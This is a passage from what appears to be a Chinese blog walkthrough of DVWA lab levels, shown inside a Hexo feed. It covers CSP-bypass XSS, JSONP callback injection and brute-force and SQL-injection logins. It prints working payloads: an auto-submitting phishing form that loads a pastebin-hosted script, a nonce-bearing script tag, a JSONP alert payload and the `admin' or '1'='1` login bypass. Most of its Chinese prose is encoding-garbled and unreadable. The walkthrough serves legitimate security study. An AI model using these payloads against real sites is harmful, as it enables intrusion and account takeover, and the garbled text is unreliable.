ä¿å­˜åœ¨å—ä¿¡ä»»çš„ç½‘ç«™ä¸Šï¼Œç„¶åŽæŠŠé“¾æŽ¥å‘é€ç»™éœ€è¦æ”»å‡»çš„ç”¨æˆ·ï¼Œç”¨æˆ·ç‚¹å‡»åŽï¼Œè¾¾åˆ°æ³¨å…¥ç›®çš„ã€‚</p><p>å¯ä»¥åœ¨New Pasteä¸­å†™ä¸‹ä»£ç ï¼Œç‚¹å‡»createåŽ»åˆ›å»ºé“¾æŽ¥</p><p><img src="D:\blog\source_posts\DVWAï¼šXSS\CSPå—ä¿¡ä»»ç½‘ç«™.png" alt="CSPå—ä¿¡ä»»ç½‘ç«™"></p><p>ç‚¹å‡»rawå½¢å¼(åŽŸç”Ÿ)æ¥æ˜¾ç¤º</p><p><img src="D:\blog\source_posts\DVWAï¼šXSS\ç‚¹å‡»rawå½¢å¼(åŽŸç”Ÿ)æ¥æ˜¾ç¤º,.jpg" alt="ç‚¹å‡»rawå½¢å¼(åŽŸç”Ÿ)æ¥æ˜¾ç¤º,"></p><p>å¤åˆ¶é“¾æŽ¥</p><p><img src="D:\blog\source_posts\DVWAï¼šXSS\å¤åˆ¶é“¾æŽ¥.png" alt="å¤åˆ¶é“¾æŽ¥"></p><p>å½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡CSRFå®žçŽ°æ”»å‡»ï¼Œåšä¸€ä¸ªé’“é±¼ç½‘ç«™ï¼Œé€šè¿‡å‘é€é‚®ä»¶ç­‰æ–¹å¼è®©ç”¨æˆ·æ”¶åˆ°é“¾æŽ¥åŽï¼Œè¯±æƒ‘ç‚¹å‡»ï¼Œç”¨æˆ·ç‚¹å‡»åŽï¼Œåˆ™è¢«è¢«æ”»å‡»ã€‚ä¾‹å¦‚å¦‚ä¸‹æž„é€ ä¸€ä¸ªé’“é±¼ç½‘ç«™</p><pre><code>&lt;form action=&quot; http://127.0.0.1/dvwa/vulnerabilities/csp/&quot; id=&quot;csp&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot;/&gt;&lt;/form&gt;&lt;script&gt;var form = document.getElementById(&quot;csp&quot;);form[0].value=&quot;https://pastebin.com/raw/R570EE00&quot;; form.submit(); &lt;/script&gt;</code></pre><h2 id="Medium-3"><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h2><pre><code>&lt;?php//å¢žåŠ äº†nonce$headerCSP = &quot;Content-Security-Policy: script-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#39;;&quot;;header($headerCSP);// Disable XSS protections so that inline alert boxes will workheader (&quot;X-XSS-Protection: 0&quot;);//å¦‚æžœè„šæœ¬ï¼ˆä¾‹å¦‚&lt;script nonce=&quot;r@nd0m&quot;&gt;ï¼šï¼‰æ ‡è®°åŒ…å«ä¸ŽCSPæ ‡å¤´ä¸­æŒ‡å®šçš„éšæœºæ•°åŒ¹é…çš„éšæœºæ•°å±žæ€§ï¼Œåˆ™å…è®¸æ‰§è¡Œå†…è”è„šæœ¬æˆ–CSS ã€‚éšæœºæ•°åº”ä¸ºå®‰å…¨çš„éšæœºå­—ç¬¦ä¸²ï¼Œå¹¶ä¸”ä¸åº”é‡å¤ä½¿ç”¨ã€‚# &lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;?&gt;&lt;?phpif (isset ($_POST[&#39;include&#39;])) &#123;$page[ &#39;body&#39; ] .= &quot;    &quot; . $_POST[&#39;include&#39;] . &quot;&quot;;&#125;$page[ &#39;body&#39; ] .= &#39;&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;    &lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt;    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;&lt;/form&gt;&#39;;</code></pre><p>httpå¤´ä¿¡æ¯ä¸­çš„script-srcçš„åˆæ³•æ¥æºå‘ç”Ÿäº†å˜åŒ–ï¼Œè¯´æ˜Žå¦‚ä¸‹</p><ul><li>unsafe-inlineï¼Œå…è®¸ä½¿ç”¨å†…è”èµ„æºï¼Œå¦‚å†…è”&lt; script&gt;å…ƒç´ ï¼Œjavascript:URLï¼Œå†…è”äº‹ä»¶å¤„ç†ç¨‹åºï¼ˆå¦‚onclickï¼‰å’Œå†…è”&lt; style&gt;å…ƒç´ ã€‚å¿…é¡»åŒ…æ‹¬å•å¼•å·ã€‚</li><li>nonce-sourceï¼Œä»…å…è®¸ç‰¹å®šçš„å†…è”è„šæœ¬å—ï¼Œnonce=â€TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=â€</li></ul><p>çŽ°åœ¨æ›´åŠ ç®€å•äº†ï¼Œå¯ä»¥ç›´æŽ¥è¾“å…¥ä»¥ä¸‹ä»£ç </p><p>Â <script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script></p><p>å¼¹å‡ºå¦‚ä¸‹ä¿¡æ¯æ¡†ï¼Œè¡¨ç¤ºæ³¨å…¥æˆåŠŸã€‚</p><h2 id="High-3"><a href="#High-3" class="headerlink" title="High"></a>High</h2><p>high.php</p><pre><code>&lt;?php$headerCSP = "Content-Security-Policy: script-src 'self';";header($headerCSP);?&gt;&lt;?phpif (isset ($_POST['include'])) {$page[ 'body' ] .= "    " . $_POST['include'] . "";}$page[ 'body' ] .= '&lt;form name="csp" method="POST"&gt;    &lt;p&gt;The page makes a call to ' . DVWA_WEB_PAGE_TO_ROOT . '/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt;    &lt;p&gt;1+2+3+4+5=&lt;span id="answer"&gt;&lt;/span&gt;&lt;/p&gt;    &lt;input type="button" id="solve" value="Solve the sum" /&gt;&lt;/form&gt;&lt;script src="source/high.js"&gt;&lt;/script&gt;';</code></pre><p>high.js</p><pre><code>function clickButton() {    var s = document.createElement("script");    s.src = "source/jsonp.php?callback=solveSum";    document.body.appendChild(s);}function solveSum(obj) {    if ("answer" in obj) {        document.getElementById("answer").innerHTML = obj['answer'];    }}var solve_button = document.getElementById ("solve");if (solve_button) {    solve_button.addEventListener("click", function() {        clickButton();    });}</code></pre><p>è¿™ä¸ªçº§åˆ«å·²ç»æ²¡æœ‰è¾“å…¥æ¡†äº†ï¼Œä¸è¿‡é¢˜ç›®å·²ç»ç»™äº†è¶³å¤Ÿå¤šçš„æç¤ºã€‚</p><p>é¦–å…ˆå…ˆçœ‹ä¸€ä¸‹ CSP å¤´ï¼Œå‘çŽ°åªæœ‰ <code>script-src 'self';ï¼Œ</code> çœ‹æ¥åªå…è®¸æœ¬ç•Œé¢åŠ è½½çš„ javascript æ‰§è¡Œã€‚</p><p>ç„¶åŽç ”ç©¶äº†ä¸€ä¸‹è¿™ä¸ªç‚¹å‡»æ˜¾ç¤ºç­”æ¡ˆçš„é€»è¾‘(é€»è¾‘åœ¨ <code>source/high.js</code>é‡Œ), å¤§è‡´å¦‚ä¸‹: ç‚¹å‡»æŒ‰é’®  -&gt; js ç”Ÿæˆä¸€ä¸ª script æ ‡ç­¾(src æŒ‡å‘ source/jsonp.php?callback=solveNum),  å¹¶æŠŠå®ƒåŠ å…¥åˆ° DOM ä¸­ -&gt; js ä¸­å®šä¹‰äº†ä¸€ä¸ª solveNum çš„å‡½æ•° -&gt; å› æ­¤ script æ ‡ç­¾ä¼šæŠŠè¿œç¨‹åŠ è½½çš„  solveSum({â€œanswerâ€:â€15â€}) å½“ä½œ js ä»£ç æ‰§è¡Œ, è€Œè¿™ä¸ªå½¢å¼æ­£å¥½å°±æ˜¯è°ƒç”¨äº† solveSum å‡½æ•°,  ç„¶åŽè¿™ä¸ªå‡½æ•°å°±ä¼šåœ¨ç•Œé¢é€‚å½“çš„ä½ç½®å†™å…¥ç­”æ¡ˆã€‚</p><p>ä¸€èˆ¬æ˜¯æ²¡åŠžæ³•ä¿®æ”¹æœåŠ¡å™¨ä¸Šçš„ jsonp.php æ–‡ä»¶çš„ï¼Œä½†æ˜¯åœ¨æŸ¥çœ‹æœåŠ¡ç«¯æºç çš„æ—¶ï¼Œå¯ä»¥çœ‹åˆ°ä¸‹é¢ä»£ç :</p><pre><code>if (isset ($_POST['include'])) {$page[ 'body' ] .= "    " . $_POST['include'] . "";}</code></pre><p>jsonp.php</p><pre><code>&lt;?phpheader("Content-Type: application/json; charset=UTF-8");if (array_key_exists ("callback", $_GET)) {    $callback = $_GET['callback'];} else {    return "";}$outp = array ("answer" =&gt; "15");echo $callback . "(".json_encode($outp).")";?&gt;</code></pre><p> callback å‚æ•°å¯ä»¥è¢«æ“æŽ§ä»¥ç”Ÿæˆä»»ä½•ä½ æƒ³è¦å¾—åˆ°çš„ç»“æžœ, æ¯”å¦‚ alert, å› æ­¤å¯ä»¥æž„é€  Payload: <code>&lt;script src="source/jsonp.php?callback=alert('hacked');"&gt;&lt;/script&gt;</code>, å¹¶æŠŠè¿™ä¸ªå½“åš include å‚æ•°ä¼ Iç»™ç•Œé¢å°± æ³¨å…¥æˆåŠŸ!</p><p>æˆ–è€…æŠ“åŒ…ä¿®æ”¹solvesum</p><p><img src="/2021/07/16/dvwa-xss/blog/source_posts\DVWAï¼šXSS\CSPä¿®æ”¹solveSum.png" alt="CSPä¿®æ”¹solveSum"></p><p>å¼¹æ¡†</p><p><img src="/2021/07/16/dvwa-xss/blog/source_posts\DVWAï¼šXSS\CSPä¿®æ”¹solvesumå¼¹æ¡†.png" alt="CSPä¿®æ”¹solvesumå¼¹æ¡†"></p><h2 id="Impossible-3"><a href="#Impossible-3" class="headerlink" title="Impossible"></a>Impossible</h2><p>impossible.php</p><pre><code>&lt;?php$headerCSP = "Content-Security-Policy: script-src 'self';";header($headerCSP);?&gt;&lt;?phpif (isset ($_POST['include'])) {$page[ 'body' ] .= "    " . $_POST['include'] . "";}$page[ 'body' ] .= '&lt;form name="csp" method="POST"&gt;    &lt;p&gt;Unlike the high level, this does a JSONP call but does not use a callback, instead it hardcodes the function to call.&lt;/p&gt;&lt;p&gt;The CSP settings only allow external JavaScript on the local server and no inline code.&lt;/p&gt;    &lt;p&gt;1+2+3+4+5=&lt;span id="answer"&gt;&lt;/span&gt;&lt;/p&gt;    &lt;input type="button" id="solve" value="Solve the sum" /&gt;&lt;/form&gt;&lt;script src="source/impossible.js"&gt;&lt;/script&gt;';</code></pre><p>impossible.js</p><pre><code>function clickButton() {    var s = document.createElement("script");    s.src = "source/jsonp_impossible.php";    document.body.appendChild(s);}function solveSum(obj) {    if ("answer" in obj) {        document.getElementById("answer").innerHTML = obj['answer'];    }}var solve_button = document.getElementById ("solve");if (solve_button) {    solve_button.addEventListener("click", function() {        clickButton();    });}</code></pre><p>jsonp_impossible.php</p><pre><code>&lt;?phpheader("Content-Type: application/json; charset=UTF-8");$outp = array ("answer" =&gt; "15");echo "solveSum (".json_encode($outp).")";?&gt;</code></pre><p>è¯¥çº§åˆ«ä¸»è¦è¿˜æ˜¯ä¿®å¤äº† callback å‚æ•°å¯è¢«æŽ§åˆ¶é—®é¢˜ï¼Œæ— æ³•è¿›è¡Œæ”»å‡»</p><h2 id="JavaScriptï¼ˆJSæ”»å‡»ï¼‰"><a href="#JavaScriptï¼ˆJSæ”»å‡»ï¼‰" class="headerlink" title="JavaScriptï¼ˆJSæ”»å‡»ï¼‰"></a>JavaScriptï¼ˆJSæ”»å‡»ï¼‰</h2><h2 id="Low-4"><a href="#Low-4" class="headerlink" title="Low"></a>Low</h2><pre><code>&lt;?php$page[ 'body' ] .= &lt;&lt;&lt;EOF&lt;script&gt;/*MD5 code from herehttps://github.com/blueimp/JavaScript-MD5*///çœç•¥ä¸€äº›å‡½æ•°ã€‚ã€‚ã€‚    function generate_token() {//idä¸ºphraseå°±æ˜¯inputè¾“å…¥æ¡†ä¸­çš„å€¼ï¼Œå°†è¯¥å€¼md5åŠ å¯†åŽï¼Œä½œä¸ºtokenè¿›è¡ŒéªŒè¯        var phrase = document.getElementById("phrase").value;        document.getElementById("token").value = md5(rot13(phrase));    }    generate_token();&lt;/script&gt;EOF;?&gt;</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DVWA</title>
      <link href="2021/07/16/dvwa/"/>
      <url>2021/07/16/dvwa/</url>
      
        <content type="html"><![CDATA[<h1 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h1><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><pre><code>if( isset( $_GET[ 'Login' ] ) ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );    // Sanitise username input    $user = $_GET[ 'username' ];    $user = stripslashes( $user );    $user = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    // Sanitise password input    $pass = $_GET[ 'password' ];    $pass = stripslashes( $pass );    $pass = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    $pass = md5( $pass );    // Check database    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";</code></pre><p>å¯ä»¥é‡‡ç”¨æš´åŠ›ç ´è§£å’ŒSQLæ³¨å…¥ç­‰æ–¹å¼(è¿™é‡Œå¯¹adminå’Œpasswordæ²¡æœ‰è¿‡æ»¤)</p><h4 id="æ³•ä¸€ï¼šburpçˆ†ç ´"><a href="#æ³•ä¸€ï¼šburpçˆ†ç ´" class="headerlink" title="æ³•ä¸€ï¼šburpçˆ†ç ´"></a>æ³•ä¸€ï¼šburpçˆ†ç ´</h4><h5 id="1-æŠ“åŒ…"><a href="#1-æŠ“åŒ…" class="headerlink" title="1.æŠ“åŒ…"></a>1.æŠ“åŒ…</h5><h5 id="2-ctrl-Iå°†åŒ…å¤åˆ¶åˆ°intruderæ¨¡å—ï¼Œå› ä¸ºè¦å¯¹passwordå‚æ•°è¿›è¡Œçˆ†ç ´ï¼Œæ‰€ä»¥åœ¨passwordå‚æ•°çš„å†…å®¹ä¸¤è¾¹åŠ "><a href="#2-ctrl-Iå°†åŒ…å¤åˆ¶åˆ°intruderæ¨¡å—ï¼Œå› ä¸ºè¦å¯¹passwordå‚æ•°è¿›è¡Œçˆ†ç ´ï¼Œæ‰€ä»¥åœ¨passwordå‚æ•°çš„å†…å®¹ä¸¤è¾¹åŠ " class="headerlink" title="2.ctrl+Iå°†åŒ…å¤åˆ¶åˆ°intruderæ¨¡å—ï¼Œå› ä¸ºè¦å¯¹passwordå‚æ•°è¿›è¡Œçˆ†ç ´ï¼Œæ‰€ä»¥åœ¨passwordå‚æ•°çš„å†…å®¹ä¸¤è¾¹åŠ $"></a>2.ctrl+Iå°†åŒ…å¤åˆ¶åˆ°intruderæ¨¡å—ï¼Œå› ä¸ºè¦å¯¹passwordå‚æ•°è¿›è¡Œçˆ†ç ´ï¼Œæ‰€ä»¥åœ¨passwordå‚æ•°çš„å†…å®¹ä¸¤è¾¹åŠ $</h5><h5 id="3-é€‰ä¸­Payloadsï¼Œè½½å…¥å­—å…¸ï¼Œç‚¹å‡»Start-attackè¿›è¡Œçˆ†ç ´"><a href="#3-é€‰ä¸­Payloadsï¼Œè½½å…¥å­—å…¸ï¼Œç‚¹å‡»Start-attackè¿›è¡Œçˆ†ç ´" class="headerlink" title="3.é€‰ä¸­Payloadsï¼Œè½½å…¥å­—å…¸ï¼Œç‚¹å‡»Start attackè¿›è¡Œçˆ†ç ´"></a>3.é€‰ä¸­Payloadsï¼Œè½½å…¥å­—å…¸ï¼Œç‚¹å‡»Start attackè¿›è¡Œçˆ†ç ´</h5><h5 id="4-æœ€åŽï¼Œå°è¯•åœ¨çˆ†ç ´ç»“æžœä¸­æ‰¾åˆ°æ­£ç¡®çš„å¯†ç ï¼Œå¯ä»¥çœ‹åˆ°passwordçš„å“åº”åŒ…é•¿åº¦ï¼ˆlengthï¼‰â€œä¸Žä¼—ä¸åŒâ€ï¼Œå¯æŽ¨æµ‹passwordä¸ºæ­£ç¡®å¯†ç ï¼Œæ‰‹å·¥éªŒè¯ç™»é™†æˆåŠŸã€‚"><a href="#4-æœ€åŽï¼Œå°è¯•åœ¨çˆ†ç ´ç»“æžœä¸­æ‰¾åˆ°æ­£ç¡®çš„å¯†ç ï¼Œå¯ä»¥çœ‹åˆ°passwordçš„å“åº”åŒ…é•¿åº¦ï¼ˆlengthï¼‰â€œä¸Žä¼—ä¸åŒâ€ï¼Œå¯æŽ¨æµ‹passwordä¸ºæ­£ç¡®å¯†ç ï¼Œæ‰‹å·¥éªŒè¯ç™»é™†æˆåŠŸã€‚" class="headerlink" title="4.æœ€åŽï¼Œå°è¯•åœ¨çˆ†ç ´ç»“æžœä¸­æ‰¾åˆ°æ­£ç¡®çš„å¯†ç ï¼Œå¯ä»¥çœ‹åˆ°passwordçš„å“åº”åŒ…é•¿åº¦ï¼ˆlengthï¼‰â€œä¸Žä¼—ä¸åŒâ€ï¼Œå¯æŽ¨æµ‹passwordä¸ºæ­£ç¡®å¯†ç ï¼Œæ‰‹å·¥éªŒè¯ç™»é™†æˆåŠŸã€‚"></a>4.æœ€åŽï¼Œå°è¯•åœ¨çˆ†ç ´ç»“æžœä¸­æ‰¾åˆ°æ­£ç¡®çš„å¯†ç ï¼Œå¯ä»¥çœ‹åˆ°passwordçš„å“åº”åŒ…é•¿åº¦ï¼ˆlengthï¼‰â€œä¸Žä¼—ä¸åŒâ€ï¼Œå¯æŽ¨æµ‹passwordä¸ºæ­£ç¡®å¯†ç ï¼Œæ‰‹å·¥éªŒè¯ç™»é™†æˆåŠŸã€‚</h5><h4 id="æ³•äºŒï¼šSQLæ³¨å…¥"><a href="#æ³•äºŒï¼šSQLæ³¨å…¥" class="headerlink" title="æ³•äºŒï¼šSQLæ³¨å…¥"></a>æ³•äºŒï¼šSQLæ³¨å…¥</h4><pre><code>adminâ€™ or â€™1â€²=â€™1  </code></pre><p>æˆ–è€…</p><pre><code>adminâ€™ #</code></pre><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>æ­¤é˜¶æ®µåœ¨å¤±è´¥çš„ç™»å½•é¡µé¢ä¸ŠåŠ ä¸Šäº†sleep(2)ï¼Œè¿™æ„å‘³ç€å½“æˆ‘ä»¬è¾“å…¥çš„ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯æ—¶ï¼Œå°†éœ€è¦ç­‰å¾…é¢å¤–çš„ä¸¤ç§’é’Ÿæ‰èƒ½çœ‹åˆ°é”™è¯¯é¡µé¢ã€‚è¿™åªä¼šå‡å°‘å•ä½æ—¶é—´å†…å¯å¤„ç†çš„è¯·æ±‚æ•°é‡ï¼Œä»Žè€Œä½¿æš´åŠ›ç ´è§£çš„æ—¶é—´æ›´é•¿ã€‚</p><p>å¦å¤–ï¼Œæœ¬é˜¶æ®µæºç é€šè¿‡mysql-real-escape-string()å‡½æ•°å¯¹è¾“å…¥çš„ç”¨æˆ·åå’Œå¯†ç ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰ï¼Œä»¥é˜²æ­¢sqlæ³¨å…¥ï¼Œå› æ­¤æ— æ³•ä½¿ç”¨ä¸‡èƒ½å¯†é’¥ç™»å½•ã€‚</p><pre><code>&lt;?phpif( isset( $_GET[ 'Login' ] ) ) {    // Sanitise username input    $user = $_GET[ 'username' ];    $user = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    // Sanitise password input    $pass = $_GET[ 'password' ];    $pass = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    $pass = md5( $pass );    // Check the database    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );    if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {        // Get users details        $row    = mysqli_fetch_assoc( $result );        $avatar = $row["avatar"];        // Login successful        $html .= "&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;";        $html .= "&lt;img src=\"{$avatar}\" /&gt;";    }    else {        // Login failed        sleep( 2 );        $html .= "&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;";    }    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);}?&gt;</code></pre><h4 id="burpçˆ†ç ´"><a href="#burpçˆ†ç ´" class="headerlink" title="burpçˆ†ç ´"></a>burpçˆ†ç ´</h4><p>ä¸ŽLow Levelä¸­çš„æ–¹æ³•ä¸€ç›¸åŒï¼Œä¸å†èµ˜è¿°ã€‚å¦å¤–ï¼Œå¦‚æžœè¦ç”¨æˆ·åå¯†ç ä¸€èµ·çˆ†ç ´ï¼Œå¯ä»¥å°†æ”»å‡»ç±»åž‹æ”¹ä¸ºcluster bombæ¨¡å¼ã€‚</p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><pre><code>&lt;?phpif( isset( $_GET[ 'Login' ] ) ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );    // Sanitise username input    $user = $_GET[ 'username' ];    $user = stripslashes( $user );    $user = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    // Sanitise password input    $pass = $_GET[ 'password' ];    $pass = stripslashes( $pass );    $pass = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    $pass = md5( $pass );    // Check database    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );    if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {        // Get users details        $row    = mysqli_fetch_assoc( $result );        $avatar = $row["avatar"];        // Login successful        $html .= "&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;";        $html .= "&lt;img src=\"{$avatar}\" /&gt;";    }    else {        // Login failed        sleep( rand( 0, 3 ) );        $html .= "&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;";    }    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><p>ç™»å½•éªŒè¯æäº¤äº†å››ä¸ªå‚æ•°ï¼šusernameã€passwordã€user_tokenã€login</p><p>æ¯æ¬¡æœåŠ¡å™¨è¿”å›žçš„ç™»é™†é¡µé¢ä¸­éƒ½ä¼šåŒ…å«ä¸€ä¸ªéšæœºçš„user_tokençš„å€¼ï¼Œç”¨æˆ·æ¯æ¬¡ç™»å½•æ—¶éƒ½è¦å°†user_tokenä¸€èµ·æäº¤ã€‚æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åŽï¼Œä¼šä¼˜å…ˆåštokençš„æ£€æŸ¥ï¼Œå†è¿›è¡ŒsqlæŸ¥è¯¢ã€‚</p><p>æºç ä½¿ç”¨äº†stripslashes()ã€ mysql_real_escape_string()å¯¹å‚æ•°usernameã€passwordè¿›è¡Œè¿‡æ»¤ã€è½¬ä¹‰ï¼Œè¿›ä¸€æ­¥æŠµå¾¡sqlæ³¨å…¥ã€‚</p><h4 id="stripslashes"><a href="#stripslashes" class="headerlink" title="stripslashes()"></a><strong>stripslashes()</strong></h4><p>åŽ»é™¤å­—ç¬¦ä¸²ä¸­çš„åæ–œçº¿å­—ç¬¦ï¼Œå¦‚æžœæœ‰ä¸¤ä¸ªè¿žç»­çš„åæ–œçº¿ï¼Œåˆ™åªåŽ»æŽ‰ä¸€ä¸ªã€‚</p><h4 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_real_escape_string()"></a>mysql_real_escape_string()</h4><p>å‡½æ•°è½¬ä¹‰ SQL è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ã€‚</p><p>ä¸‹åˆ—å­—ç¬¦å—å½±å“ï¼š</p><ul><li><ul><li>\x00</li><li>\n</li><li>\r</li><li>\</li><li>â€˜</li><li>â€œ</li><li>\x1a</li></ul></li></ul><p>å¦‚æžœæˆåŠŸï¼Œåˆ™è¯¥å‡½æ•°è¿”å›žè¢«è½¬ä¹‰çš„å­—ç¬¦ä¸²ã€‚å¦‚æžœå¤±è´¥ï¼Œåˆ™è¿”å›ž falseã€‚</p><h5 id="é”™è¯¯é¡µé¢ä½¿ç”¨äº†sleep-rand-0-3-ï¼Œä¹Ÿå°±æ˜¯è¯´å½“æˆ‘ä»¬è¾“å…¥é”™è¯¯çš„ç”¨æˆ·åæˆ–å¯†ç æ—¶ï¼Œä¼šéšæœºç­‰å¾…0-3ç§’åŽæ‰æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ã€‚é™ä½Žäº†æš´åŠ›ç ´è§£çš„æ•ˆçŽ‡ã€‚"><a href="#é”™è¯¯é¡µé¢ä½¿ç”¨äº†sleep-rand-0-3-ï¼Œä¹Ÿå°±æ˜¯è¯´å½“æˆ‘ä»¬è¾“å…¥é”™è¯¯çš„ç”¨æˆ·åæˆ–å¯†ç æ—¶ï¼Œä¼šéšæœºç­‰å¾…0-3ç§’åŽæ‰æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ã€‚é™ä½Žäº†æš´åŠ›ç ´è§£çš„æ•ˆçŽ‡ã€‚" class="headerlink" title="é”™è¯¯é¡µé¢ä½¿ç”¨äº†sleep( rand( 0, 3 ) );ï¼Œä¹Ÿå°±æ˜¯è¯´å½“æˆ‘ä»¬è¾“å…¥é”™è¯¯çš„ç”¨æˆ·åæˆ–å¯†ç æ—¶ï¼Œä¼šéšæœºç­‰å¾…0-3ç§’åŽæ‰æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ã€‚é™ä½Žäº†æš´åŠ›ç ´è§£çš„æ•ˆçŽ‡ã€‚"></a>é”™è¯¯é¡µé¢ä½¿ç”¨äº†sleep( rand( 0, 3 ) );ï¼Œä¹Ÿå°±æ˜¯è¯´å½“æˆ‘ä»¬è¾“å…¥é”™è¯¯çš„ç”¨æˆ·åæˆ–å¯†ç æ—¶ï¼Œä¼šéšæœºç­‰å¾…0-3ç§’åŽæ‰æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ã€‚é™ä½Žäº†æš´åŠ›ç ´è§£çš„æ•ˆçŽ‡ã€‚</h5><h4 id="é‡‡ç”¨burpçˆ†ç ´"><a href="#é‡‡ç”¨burpçˆ†ç ´" class="headerlink" title="é‡‡ç”¨burpçˆ†ç ´"></a>é‡‡ç”¨burpçˆ†ç ´</h4><h5 id="1-æŠ“åŒ…ï¼Œå‘é€åˆ°Intruderæ¨¡å—"><a href="#1-æŠ“åŒ…ï¼Œå‘é€åˆ°Intruderæ¨¡å—" class="headerlink" title="1.æŠ“åŒ…ï¼Œå‘é€åˆ°Intruderæ¨¡å—"></a>1.æŠ“åŒ…ï¼Œå‘é€åˆ°Intruderæ¨¡å—</h5><h5 id="2-é€‰æ‹©Pitchfork-è‰å‰æ¨¡å¼-ï¼Œæ·»åŠ çˆ†ç ´çš„å‚æ•°"><a href="#2-é€‰æ‹©Pitchfork-è‰å‰æ¨¡å¼-ï¼Œæ·»åŠ çˆ†ç ´çš„å‚æ•°" class="headerlink" title="2.é€‰æ‹©Pitchfork(è‰å‰æ¨¡å¼)ï¼Œæ·»åŠ çˆ†ç ´çš„å‚æ•°"></a>2.é€‰æ‹©Pitchfork(è‰å‰æ¨¡å¼)ï¼Œæ·»åŠ çˆ†ç ´çš„å‚æ•°</h5><h5 